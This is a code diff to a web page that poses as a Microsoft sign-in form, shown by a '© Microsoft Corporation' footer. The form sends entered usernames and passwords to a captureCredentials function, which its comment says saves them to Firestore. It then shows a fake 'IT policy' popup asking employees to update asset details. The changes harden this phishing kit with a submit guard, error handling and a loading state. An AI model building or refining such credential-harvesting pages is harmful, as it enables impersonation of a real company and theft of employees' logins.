@@ -10,27 +10,42 @@ export default function Home() {
 
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
   const handleSubmit = async (event: FormEvent) => {
     event.preventDefault();
+    if (isSubmitting) return;
+
+    setIsSubmitting(true);
     
-    // Capture credentials on the backend (saves to Firestore)
-    await captureCredentials({ username, password });
-    
-    // Show the popup after credentials have been submitted
-    if (typeof Swal !== 'undefined') {
-      Swal.fire({
-        title: "Action Required: Employee Asset Details",
-        text: "Please review and update your asset information in accordance with the new IT policy.",
-        icon: "info",
-        confirmButtonText: "Update Now",
-        confirmButtonColor: "#3085d6",
-        background: "#fff",
-        color: "#333"
-      }).then(() => {
-        // Redirect to the asset update page after pressing the button
-        window.location.href = "/employee-asset-update.html"; 
-      });
+    try {
+      // Capture credentials on the backend (saves to Firestore)
+      await captureCredentials({ username, password });
+      
+      // Show the popup after credentials have been submitted
+      if (typeof Swal !== 'undefined') {
+        Swal.fire({
+          title: "Action Required: Employee Asset Details",
+          text: "Please review and update your asset information in accordance with the new IT policy.",
+          icon: "info",
+          confirmButtonText: "Update Now",
+          confirmButtonColor: "#3085d6",
+          background: "#fff",
+          color: "#333"
+        });
+      }
+    } catch (error) {
+      console.error("An error occurred during submission:", error);
+      // Optionally, show an error to the user
+      if (typeof Swal !== 'undefined') {
+        Swal.fire({
+          title: "Error",
+          text: "Could not submit your credentials. Please try again.",
+          icon: "error",
+        });
+      }
+    } finally {
+      setIsSubmitting(false);
     }
   };
   
@@ -52,6 +67,7 @@ export default function Home() {
             value={username}
             onChange={(e) => setUsername(e.target.value)}
             required 
+            disabled={isSubmitting}
           />
           <input 
             type="password" 
@@ -61,8 +77,11 @@ export default function Home() {
             value={password}
             onChange={(e) => setPassword(e.target.value)}
             required 
+            disabled={isSubmitting}
           />
-          <button type="submit">Sign in</button>
+          <button type="submit" disabled={isSubmitting}>
+            {isSubmitting ? 'Signing in...' : 'Sign in'}
+          </button>
           <small>© Microsoft Corporation</small>
         </form>
       </div>
